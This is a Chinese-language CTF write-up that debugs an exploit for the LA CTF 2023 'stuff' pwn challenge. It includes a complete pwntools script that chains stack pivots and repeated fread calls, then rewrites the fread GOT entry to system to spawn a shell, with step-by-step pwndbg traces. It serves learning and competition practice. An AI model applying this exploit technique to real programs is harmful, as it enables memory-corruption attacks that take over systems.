# stuff

[题目](https://github.com/uclaacm/lactf-archive/tree/main/2023/pwn/stuff)

[wp](https://4n0nym4u5.github.io/2023/02/12/LA_CTF_23/#stuff)不长，但是把我看懵了。作者在里面介绍了一种之前没见过的技巧，这里记录一下调试结果。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```

```c
   1   │ int __cdecl main(int argc, const char **argv, const char **envp)
   2   │ {
   3   │   void *v4; // rax
   4   │   char ptr[12]; // [rsp+0h] [rbp-10h] BYREF
   5   │   int v6; // [rsp+Ch] [rbp-4h] BYREF
   6   │ 
   7   │   setbuf(stdout, 0LL);
   8   │   do
   9   │   {
  10   │     while ( 1 )
  11   │     {
  12   │       puts("menu:");
  13   │       puts("1. leak");
  14   │       puts("2. do stuff");
  15   │       if ( __isoc99_scanf("%d", &v6) != 1 )
  16   │       {
  17   │         puts("oops");
  18   │         return 1;
  19   │       }
  20   │       if ( v6 != 1 )
  21   │         break;
  22   │       v4 = malloc(8uLL);
  23   │       printf("here's your leak: %p\n", v4);
  24   │     }
  25   │   }
  26   │   while ( v6 != 2 );
  27   │   fread(ptr, 1uLL, 0x20uLL, stdin);                                                                                                                                                                               
  28   │ 
  29   │   return 0;
  30   │ }
```

以上是elf文件的ida反编译结果。我们可以获取一个heap地址，末尾的fread有个bof。不过这个bof不够大，很容易想到用栈迁移打。但是这题一个很大的问题在于，程序里的gadget基本没用，pop rdi这种直接传参的gadget根本找不到，栈迁移了也没法getshell。于是大佬就介绍了自己的一种方法，在他的另一篇[自出题wp](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/pwn/gets/solution)里也有使用。他将其称为House of Rootkit，不过我感觉叫double read可能更好理解。这种方法利用读取函数（此题里是fread，另一道题是gets，不知道其他的例如read行不行），溢出时将返回地址填为main函数里调用fread类型函数的地址。因为fread的ptr参数是动态取址：

```
|    |      0x0040120f      488b154a2e00.  mov rdx, qword [obj.stdin]  ; obj.stdin_GLIBC_2.2.5
|    |                                                                 ; [0x404060:8]=0
|    |      0x00401216      488d45f0       lea rax, [ptr]              ; ptr=rbp-0x10
|    |      0x0040121a      4889d1         mov rcx, rdx                ; FILE *stream
|    |      0x0040121d      ba20000000     mov edx, 0x20               ; 32 ; size_t nmemb
|    |      0x00401222      be01000000     mov esi, 1                  ; size_t size
|    |      0x00401227      4889c7         mov rdi, rax                ; void *ptr
|    |      0x0040122a      e841feffff     call sym.imp.fread          ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
```

ptr虽然固定在rbp-0x10处，但是rbp是可以被我们覆盖控制的，勉勉强强算个低配版任意地址写。不过就这一下也没什么用，重点在fread的末尾：

```
   0x00007ffff7a9aa9d <+205>:  add    rsp,0x8
   0x00007ffff7a9aaa1 <+209>:  mov    rax,rbx
   0x00007ffff7a9aaa4 <+212>:  pop    rbx
   0x00007ffff7a9aaa5 <+213>:  pop    rbp
   0x00007ffff7a9aaa6 <+214>:  pop    r12
   0x00007ffff7a9aaa8 <+216>:  pop    r13
   0x00007ffff7a9aaaa <+218>:  ret 
```

发现可以控制rbx和rbp。rbp可以控制fread的ptr，rbx在`add    dword ptr [rbp - 0x3d], ebx`这个gadget里有用到。如果我们能让rbp-0x3d是某个函数的got表地址，ebx是其与system的偏移，这不就成功修改got表了吗？先放wp，因为下面的我不懂了。

```python
from pwn import *
exe = context.binary = ELF("stuff")
p=process("stuff")
sla=lambda d,payload:p.sendlineafter(d,payload)
rl=lambda:p.recvline()
sl=lambda payload:p.sendline(payload)
def choice(option):
    sla(b"2. do stuff\n", str(option).encode())
libc = ELF("libc.so.6")
choice(1)
heap_base = int(rl()[:-1].split(b'0x')[1],16)- 0x12EC0
bss = 0x404075
call_read = 0x000000000040120F
choice(2)
sl(
    b"a" * 15 + p64(0x404075 + 0x100 + 0x88) + p64(call_read) + b"\xff"#第一次read，rbp为0x404075 + 0x100 + 0x88=0x4041fd。末尾的\xff似乎没用，我换成\x99也行,\x11也行。可能换成任意字符都行，但是不加是不行的
)  # call fread while u have pivoted to bss
sl(
    b"a" * 6 + p64(0xDEADBEEF) + p64(0x404075 + 0x100 + 0x88 - 25) + p64(call_read)#往0x4041fd继续写rop链，rbp为0x404075 + 0x100 + 0x88 - 25=0x4041e4，第二次read
)  # overwrite the return address of internal fread function
sl(
    p64(0xFFFFFFFFFFFD5470)
    + p64(heap_base + 0x11EC8 - 8)  # stack pivot here
    + b"/bin/sh\x00" #heap_base + 0x11EC0
    + p64(0x000000000040115d)+p64(exe.got.fread + 0x3D)#pop rbp ; ret
    + p64(0x0000000040115C)  # add    dword ptr [rbp - 0x3d], ebx  改got表
    + p64(0x000000000040115d)+p64(heap_base + 0x11EC0 + 0x10)  # set rbp -> binsh pointer，加上0x10是因为fread函数的rbp-0x10
    + p64(0x000000000040101a)#ret=pop eip，返回call_read，也就是system
    + p64(call_read)  # fread is not system and rdi is a pointer to binsh. shell!!! 成功在无法控制rdi时getshell
)
p.interactive()
```

下面是调试环节。首先我在0x0040122a处下了个断点，第一次命中断点时是main函数里的正常调用fread。

```sh
Breakpoint 1, 0x000000000040122a in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0x7fffffffdbe0 ◂— 0x0
*RBX  0x7fffffffdd08 —▸ 0x7fffffffe07a ◂— '/home/forregisterusehhh/work/stuff/stuff'
*RCX  0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*RDX  0x20
*RDI  0x7fffffffdbe0 ◂— 0x0
*RSI  0x1
*R8   0x1999999999999999
*R9   0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*R10  0x7ffff7c29ac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
*R11  0x7ffff7c2a3c0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002
 R12  0x0
*R13  0x7fffffffdd18 —▸ 0x7fffffffe0a3 ◂— 'SHELL=/bin/bash'
*R14  0x403de8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401140 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd000 (_rtld_local) —▸ 0x7ffff7ffe2c0 ◂— 0x0
*RBP  0x7fffffffdbf0 ◂— 0x1
*RSP  0x7fffffffdbe0 ◂— 0x0
*RIP  0x40122a (main+180) ◂— call 0x401070
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x40122a <main+180>    call   fread@plt                      <fread@plt>
        ptr: 0x7fffffffdbe0 ◂— 0x0
        size: 0x1
        n: 0x20
        stream: 0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088

   0x40122f <main+185>    mov    eax, 0
   0x401234 <main+190>    leave  
   0x401235 <main+191>    ret    

   0x401236               add    byte ptr [rax], al
   0x401238 <_fini>       endbr64 
   0x40123c <_fini+4>     sub    rsp, 8
   0x401240 <_fini+8>     add    rsp, 8
   0x401244 <_fini+12>    ret    

   0x401245               add    byte ptr [rax], al
   0x401247               add    byte ptr [rax], al
───────\\x80───────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rax rdi rsp 0x7fffffffdbe0 ◂— 0x0
01:0008│             0x7fffffffdbe8 ◂— 0x2004052a0
02:0010│ rbp         0x7fffffffdbf0 ◂— 0x1
03:0018│             0x7fffffffdbf8 —▸ 0x7ffff7ad3510 (__libc_start_call_main+128) ◂— mov edi, eax
04:0020│             0x7fffffffdc00 —▸ 0x7fffffffdd18 —▸ 0x7fffffffe0a3 ◂— 'SHELL=/bin/bash'
05:0028│             0x7fffffffdc08 —▸ 0x401176 (main) ◂— push rbp
06:0030│             0x7fffffffdc10 ◂— 0x1000011bf
```

往ptr（0x7fffffffdbe0）里面读内容。随便输了几个字符,ptr里的内容如下：

```
pwndbg> $ x/32gx 0x7fffffffdbe0
0x7fffffffdbe0:    0x616161616161610a    0x6161616161616161
0x7fffffffdbf0:    0x610a610a61616161    0x610a610a610a610a
0x7fffffffdc00:    0x00007fffffffdd18    0x0000000000401176
0x7fffffffdc10:    0x00000001000011bf    0x00007fffffffdd08
0x7fffffffdc20:    0x00007fffffffdd08    0x93a87b62bf951393
0x7fffffffdc30:    0x0000000000000000    0x00007fffffffdd18
0x7fffffffdc40:    0x0000000000403de8    0x00007ffff7ffd000
0x7fffffffdc50:    0x6c57849d07971393    0x6c579438d61f1393
0x7fffffffdc60:    0x0000000000000000    0x0000000000000000
0x7fffffffdc70:    0x0000000000000000    0x00007fffffffdd08
0x7fffffffdc80:    0x0000000000000001    0xc6dec1364f8fe600
0x7fffffffdc90:    0x0000000000000000    0x00007ffff7ad35c9
0x7fffffffdca0:    0x0000000000401176    0x0000000000403de8
0x7fffffffdcb0:    0x0000000000000000    0x0000000000000000
0x7fffffffdcc0:    0x0000000000000000    0x0000000000401090
0x7fffffffdcd0:    0x00007fffffffdd00    0x0000000000000000
```

接下来我们在第一次rop链那里进入断点。此时的ptr就有改变了。

```sh
Breakpoint 1, 0x000000000040122a in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0x4041ed ◂— 0x0
 RBX  0x7fffffffdd08 —▸ 0x7fffffffe07a ◂— '/home/forregisterusehhh/work/stuff/stuff'
 RCX  0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RDX  0x20
*RDI  0x4041ed ◂— 0x0
 RSI  0x1
*R8   0xc00
 R9   0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*R10  0x7ffff7ab79d8 ◂— 0x100022000076c4
*R11  0x246
 R12  0x0
 R13  0x7fffffffdd18 —▸ 0x7fffffffe0a3 ◂— 'SHELL=/bin/bash'
 R14  0x403de8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401140 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7ffff7ffd000 (_rtld_local) —▸ 0x7ffff7ffe2c0 ◂— 0x0
*RBP  0x4041fd ◂— 0x0
*RSP  0x7fffffffdc00 —▸ 0x7fffffffdd18 —▸ 0x7fffffffe0a3 ◂— 'SHELL=/bin/bash'
 RIP  0x40122a (main+180) ◂— call 0x401070
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x40122a <main+180>    call   fread@plt                      <fread@plt>
        ptr: 0x4041ed ◂— 0x0
        size: 0x1
        n: 0x20
        stream: 0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088

   0x40122f <main+185>    mov    eax, 0
   0x401234 <main+190>    leave  
   0x401235 <main+191>    ret    

   0x401236               add    byte ptr [rax], al
   0x401238 <_fini>       endbr64 
   0x40123c <_fini+4>     sub    rsp, 8
   0x401240 <_fini+8>     add    rsp, 8
   0x401244 <_fini+12>    ret    

   0x401245               add    byte ptr [rax], al
   0x401247               add    byte ptr [rax], al
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│\x1b[0m rsp 0x7fffffffdc00 —▸ 0x7fffffffdd18 —▸ 0x7fffffffe0a3 ◂— 'SHELL=/bin/bash'
01:0008│     0x7fffffffdc08 —▸ 0x401176 (main) ◂— push rbp
02:0010│     0x7fffffffdc10 ◂— 0x1000011bf
```

ptr成了0x4041ed,正是刚才rop链覆盖的rbp-0x10（0x404075 + 0x100 + 0x88-0x10）。这个地址在bss段。接下来，我们在0x00401235处下个断点，返回去看一下第一个rop链输入进0x7fffffffdbe0后是什么样的。

```sh
Breakpoint 1, 0x0000000000401235 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 RAX  0x0
*RBX  0x7fffffffdd08 —▸ 0x7fffffffe07a ◂— '/home/forregisterusehhh/work/stuff/stuff'
*RCX  0x1
*RDX  0x1
*RDI  0x7ffff7c81a40 (_IO_stdfile_0_lock) ◂— 0x0
*RSI  0x416eb0 ◂— 0x6161616161616161 ('aaaaaaaa')
*R8   0xc00
*R9   0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*R10  0x7ffff7ab79d8 ◂— 0x100022000076c4
*R11  0x246
 R12  0x0
*R13  0x7fffffffdd18 —▸ 0x7fffffffe0a3 ◂— 'SHELL=/bin/bash'
*R14  0x403de8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401140 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd000 (_rtld_local) —▸ 0x7ffff7ffe2c0 ◂— 0x0
*RBP  0x4041fd ◂— 0x0
*RSP  0x7fffffffdbf8 —▸ 0x40120f (main+153) ◂— mov rdx, qword ptr [rip + 0x2e4a]
*RIP  0x401235 (main+191) ◂— ret 
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x401235 <main+191>    ret                                  <0x40120f; main+153>
    ↓
   0x40120f <main+153>    mov    rdx, qword ptr [rip + 0x2e4a] <stdin@GLIBC_2.2.5>
   0x401216 <main+160>    lea    rax, [rbp - 0x10]
   0x40121a <main+164>    mov    rcx, rdx
   0x40121d <main+167>    mov    edx, 0x20
   0x401222 <main+172>    mov    esi, 1
   0x401227 <main+177>    mov    rdi, rax
   0x40122a <main+180>    call   fread@plt                      <fread@plt>

   0x40122f <main+185>    mov    eax, 0
   0x401234 <main+190>    leave  
   0x401235 <main+191>    \x1b[38;5;148mret                                  <0x40120f; main+153>
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7fffffffdbf8 —▸ 0x40120f (main+153) ◂— mov rdx, qword ptr [rip + 0x2e4a]
01:0008│     0x7fffffffdc00 —▸ 0x7fffffffdd18 —▸ 0x7fffffffe0a3 ◂— 'SHELL=/bin/bash'
02:0010│     0x7fffffffdc08 —▸ 0x401176 (main) ◂— push rbp
03:0018│     0x7fffffffdc10 ◂— 0x1000011bf
```

0x7fffffffdbe0处的栈长什么样呢？

```
pwndbg> $ x/32gx 0x7fffffffdbe0
0x7fffffffdbe0:    0x616161616161610a    0x6161616161616161
0x7fffffffdbf0:    0x00000000004041fd    0x000000000040120f
0x7fffffffdc00:    0x00007fffffffdd18    0x0000000000401176
0x7fffffffdc10:    0x00000001000011bf    0x00007fffffffdd08
0x7fffffffdc20:    0x00007fffffffdd08    0xe44322f4aa612168
0x7fffffffdc30:    0x0000000000000000    0x00007fffffffdd18
0x7fffffffdc40:    0x0000000000403de8    0x00007ffff7ffd000
```

现在的rbp是0x4041fd，返回地址是0x40120f。该rop链执行后会将esp改为0x00000000004041fd（leave指令），rbp会称为rsp所指的`0x00000000004041e4`（参考[ciscn_2019_es_2](../../BUUCTF/Pwn/ciscn_2019_es_2.md)，即第二个rop链，内容如下：

```
pwndbg> $ x/32gx 0x4041ed
0x4041ed:    0x6161616161610aff    0x00000000deadbeef
0x4041fd:    0x00000000004041e4    0x000000000040120f
```

注意ff是第一个rop链的。第一个rop链执行到fread就直接跳转了，剩下的ff就留到了下次（这里不太确定，想不出来别的理由了）。这里的ff没啥用，是为了把第一个payload补全到0x20的长度，否则fread没读到0x20的字符是不会继续往下执行的。接下来看第二个rop链里read的情况。

```sh
Breakpoint 1, 0x000000000040122a in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0x4041d4 ◂— 0x0
 RBX  0x7fffffffdd08 —▸ 0x7fffffffe07a ◂— '/home/forregisterusehhh/work/stuff/stuff'
 RCX  0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RDX  0x20
*RDI  0x4041d4 ◂— 0x0
 RSI  0x1
 R8   0xc00
 R9   0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 R10  0x7ffff7ab79d8 ◂— 0x100022000076c4
 R11  0x246
 R12  0x0
 R13  0x7fffffffdd18 —▸ 0x7fffffffe0a3 ◂— 'SHELL=/bin/bash'
 R14  0x403de8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401140 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7ffff7ffd000 (_rtld_local) —▸ 0x7ffff7ffe2c0 ◂— 0x0
*RBP  0x4041e4 ◂— 0x0
*RSP  0x40420d ◂— 0x0
 RIP  0x40122a (main+180) ◂— call 0x401070
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x40122a <main+180>    call   fread@plt                      <fread@plt>
        ptr: 0x4041d4 ◂— 0x0
        size: 0x1
        n: 0x20
        stream: 0x7ffff7c7faa0 (_IO_2_1_stdin_) ◂— 0xfbad2088

   0x40122f <main+185>    mov    eax, 0
   0x401234 <main+190>    leave  
   0x401235 <main+191>    ret    

   0x401236               add    byte ptr [rax], al
   0x401238 <_fini>       endbr64 
   0x40123c <_fini+4>     sub    rsp, 8
   0x401240 <_fini+8>     add    rsp, 8
   0x401244 <_fini+12>    ret    

   0x401245               add    byte ptr [rax], al
   0x401247               add    byte ptr [rax], al
```

地址确实是0x404075 + 0x100 + 0x88 - 25-0x10=0x4041e4-0x10=0x4041d4没错。这块位置离刚才栈迁移的地方不远：

```
pwndbg> $ x/32gx 0x4041d4
0x4041d4:    0x0000000000000000    0x0000000000000000
0x4041e4:    0x0000000000000000    0x61616161610a1100
0x4041f4:    0x000000deadbeef61    0x000000004041e400
```

让我们看看读完第三个rop链后是什么情况：

```
pwndbg> $ x/32gx 0x4041d4
0x4041d4:    0xfffffffffd54700a    0x00000000416ec0ff
0x4041e4:    0x68732f6e69622f00    0x0000000040115d00
0x4041f4:    0x00000000403de800    0x007ffff7ffd00000
0x404204:    0x0000000040122f00    0x0000000000000000
```

因为main函数末尾的leave;ret,每次rop链都会实现栈迁移，因此第三个rop链读取时，rsp为0x4041d4。结合fread的末尾，rsp处的值`0xFFFFFFFFFFFD5470`会被弹入rbx，`p64(heap_base + 0x11EC8 - 8)`会被弹入rbp。这又是一次栈迁移,栈被迁移到了`p64(heap_base + 0x11EC8 - 8)`处：

```
pwndbg> $ x/32gx 4288192-16
0x416eb0:    0xfffffffffffd5470    0x0000000000416ec0
0x416ec0:    0x0068732f6e69622f    0x000000000040115d
0x416ed0:    0x0000000000404075    0x000000000040115c
0x416ee0:    0x000000000040115d    0x0000000000416ed0
0x416ef0:    0x000000000040101a    0x000000000040120f
```

最后就是改got表了。不得不说真的太巧妙了，真叫我再做一遍我保证做不出来。